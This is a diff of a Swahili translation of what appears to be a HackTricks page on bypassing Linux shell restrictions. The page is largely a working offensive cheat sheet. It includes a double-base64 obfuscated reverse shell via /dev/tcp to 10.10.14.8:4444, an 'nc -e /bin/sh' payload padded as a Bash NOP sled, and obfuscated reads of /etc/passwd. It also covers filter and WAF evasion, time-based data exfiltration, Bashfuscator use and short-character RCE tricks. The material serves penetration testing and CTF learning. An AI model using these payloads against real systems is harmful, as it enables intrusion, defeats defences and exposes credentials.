@@ -1,8 +1,10 @@
-# Bypass Linux Restrictions
+# Kupita Vizuizi vya Linux
 
-## Common Limitations Bypasses
+{{#include ../../../banners/hacktricks-training.md}}
 
-Mikusanyo ya command-injection na WAF-evasion katika PayloadsAllTheThings, cheat sheet ya Bo0oM, na makala mbili za Secjuice zilizounganishwa inatoa msingi wa tofauti za shell-syntax katika sehemu hii.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+## Mbinu za Kupita Vizuizi vya Kawaida
+
+Mikusanyo ya command-injection na WAF-evasion katika PayloadsAllTheThings, cheat sheet ya Bo0oM, na makala mbili za Secjuice zilizounganishwa hutoa msingi wa tofauti za shell-syntax katika sehemu hii.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -10,7 +12,7 @@ Mikusanyo ya command-injection na WAF-evasion katika PayloadsAllTheThings, cheat
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Short Rev shell
+### Rev shell fupi
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -78,7 +80,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Bypass nafasi zilizopigwa marufuku
+### Bypass nafasi zilizokatazwa
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -105,7 +107,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass backslash na slash
+### Bypass ya backslash na slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -129,7 +131,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Ujichotaji wa data unaotegemea muda
+### Uondoaji wa data unaotegemea muda
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -140,12 +142,12 @@ echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-Kwa callbacks za out-of-band, service ya mtindo wa collaborator kama Burp Collaborator inaweza kulazimisha application lengwa kuwasiliana na server ya nje; link iliyopo ya [**pingb**](http://pingb.in) imehifadhiwa kama navigation ya kihistoria, si dai la sasa kuhusu upatikanaji wake.<sup>[[6]](#references)</sup>
+Kwa out-of-band callbacks, huduma ya mtindo wa collaborator kama Burp Collaborator inaweza kufanya target application iwasiliane na external server; kiungo cha [**pingb**](http://pingb.in) kilichopo kimehifadhiwa kama navigation ya kihistoria, si dai la upatikanaji wa sasa.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-Katika shell yenye vizuizi, builtins zinazopatikana ndizo sehemu iliyobaki ya command surface kwa mifano hii; Bash inaeleza builtin commands zake na execution grammar.<sup>[[7]](#references)</sup> Wazo limetoka kwa [**devploit**](https://twitter.com/devploit).\
-Anza na navigation iliyopo ya [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), kisha jaribu mbinu zifuatazo mahususi za Bash:<sup>[[7]](#references)</sup>
+Katika restricted shell, builtins zinazopatikana ndizo command surface iliyosalia kwa mifano hii; Bash inaandika kuhusu builtin commands zake na execution grammar.<sup>[[7]](#references)</sup> Wazo limetoka kwa [**devploit**](https://twitter.com/devploit).\
+Anza na navigation ya [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) iliyopo, kisha jaribu techniques zifuatazo mahususi kwa Bash:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -209,14 +211,14 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 ```
 ### Bashfuscator
 
-Invocation ifuatayo inatumia Bashfuscator, framework ya open-source ya kufanya obfuscation ya Bash; kiungo cha repository kilicho kwenye maoni ya code kimehifadhiwa kwa ajili ya navigation.<sup>[[8]](#references)</sup>
+Amri ifuatayo hutumia Bashfuscator, mfumo wa open-source wa kuficha msimbo wa Bash; kiungo cha repository kwenye maoni ya msimbo kimehifadhiwa kwa ajili ya urambazaji.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### RCE kwa herufi 5
 
-Mifano miwili ya kihistoria ya herufi 5 ifuatayo imehifadhiwa kama reproductions za challenge: repository kuu ya challenge inapatikana kwenye [repository ya Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), huku link ya pili ya write-up ndani ya code block ikiwa ya urambazaji, ambayo upatikanaji wake wa sasa haukuthibitishwa.<sup>[[9]](#references)</sup>
+Mifano miwili ya kihistoria yenye herufi 5 ifuatayo imehifadhiwa kama reproductions za challenge: repository kuu ya challenge inapatikana kwenye [repository ya Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), huku link ya pili ya write-up iliyo kwenye code block ikiwa ni ya navigation ambayo upatikanaji wake wa sasa haujathibitishwa.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -263,7 +265,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE with 4 chars
+### RCE yenye herufi 4
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -300,13 +302,13 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-Ikiwa uko ndani ya mfumo wa mafaili wenye **ulinzi wa read-only na noexec**, au kwenye **distroless image**, mazingira yanaweka vikwazo vya utekelezaji vilivyoandikwa kwenye Linux `mount(8)` na mradi wa Distroless; ukurasa uliounganishwa unakusanya mbinu za kufanya kazi ndani ya vikwazo hivyo.<sup>[[11]](#references)[[12]](#references)</sup>
+Ikiwa uko ndani ya filesystem yenye ulinzi wa **read-only na noexec**, au katika **distroless image**, mazingira hayo yanaweka vikwazo vya utekelezaji vilivyoandikwa katika Linux `mount(8)` na mradi wa Distroless; ukurasa uliounganishwa unakusanya mbinu za kufanya kazi ndani ya vikwazo hivyo.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & Jails nyingine Bypass
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -314,36 +316,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wakati vulnerability inakuruhusu kudhibiti kwa sehemu argument ambayo hatimaye hufikia `system()` au shell nyingine, offset ya payload inaweza isiwe na uhakika. Alan Cao na Will Tan wanaeleza hali ya kifaa kilichowekwa vikwazo, ambapo shell payload ilisambazwa kwenye NVRAM iliyopangiliwa kwenye memory na kutanguliwa na spaces.<sup>[[5]](#references)</sup>
+Wakati vulnerability inakuruhusu kudhibiti kwa sehemu argument ambayo hatimaye inafikia `system()` au shell nyingine, offset ya payload inaweza kuwa haijulikani. Alan Cao na Will Tan wanaeleza hali ya kifaa kilichopachikwa chenye vikwazo, ambapo shell payload ilisambazwa kwenye NVRAM iliyopangiliwa kwenye memory na kuwekewa spaces mwanzoni.<sup>[[5]](#references)</sup>
 
-Kwa hiyo unaweza kuunda *NOP sled ya Bash* kwa kutanguliza command yako halisi kwa mfululizo mrefu wa spaces au tab characters; Bash hufafanua spaces na tabs kama blanks zinazotenganisha maneno katika simple command.<sup>[[5]](#references)[[7]](#references)</sup>
+Kwa hiyo unaweza kuunda *NOP sled for Bash* kwa kuweka command yako halisi baada ya mfululizo mrefu wa spaces au tab characters; Bash hufafanua spaces na tabs kama blanks zinazotenganisha maneno katika simple command.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ikiwa ROP chain (au primitive nyingine ya memory-corruption) itapitisha pointer ya command-string inayoanza popote ndani ya space block, Bash inaweza kuchanganua nafasi zinazoongoza zilizosalia hadi ifikie command; katika router exploit iliyotajwa, hii ilifanya string offsets zisizo na uhakika zitumike.<sup>[[5]](#references)[[7]](#references)</sup>
+Ikiwa ROP chain (au memory-corruption primitive nyingine) itapitisha pointer ya command-string inayoanza popote ndani ya space block, Bash inaweza kuchanganua nafasi zilizo mwanzoni hadi ifikie command; katika exploit ya d router, hii ilifanya string offsets zisizo na uhakika zitumike.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Matumizi ya vitendo katika embedded targets zenye vikwazo yanajumuisha:<sup>[[5]](#references)</sup>
+Matumizi ya kiutendaji katika embedded targets zenye vikwazo ni pamoja na:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs** (k.m. NVRAM) zinazoweza kufikiwa kati ya processes.<sup>[[5]](#references)</sup>
+1. **Memory-mapped configuration blobs** (kwa mfano NVRAM) zinazoweza kufikiwa na processes mbalimbali.<sup>[[5]](#references)</sup>
 2. Payload channels ambapo attacker hawezi kuandika NULL bytes ili kupanga payload (marekebisho ya jumla ya alignment problem).<sup>[[5]](#references)</sup>
-3. Embedded devices zenye mazingira madogo ya BusyBox `ash`/`sh`, ambayo BusyBox huyat dokument kama applets katika mifumo yenye rasilimali chache.<sup>[[10]](#references)</sup>
+3. Embedded devices zenye mazingira madogo ya BusyBox `ash`/`sh`, ambayo BusyBox huyatambulisha kama applets katika mifumo yenye rasilimali chache.<sup>[[10]](#references)</sup>
 
-> 🛠️  Unganisha technique hii na ROP gadgets zinazopiga simu `system()` katika controlled lab; utafiti wa router uliotajwa unaonyesha mchanganyiko huu kwenye constrained hardware.<sup>[[5]](#references)</sup>
+> 🛠️  Unganisha mbinu hii na ROP gadgets zinazoita `system()` katika controlled lab; utafiti wa d router unaonyesha mchanganyiko huu kwenye hardware yenye vikwazo.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [3] [Mbinu za Kukwepa Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Mbinu za Kukwepa Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 - [5] [Alan Cao and Will Tan — Kutumia zero days katika hardware iliyoachwa — blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
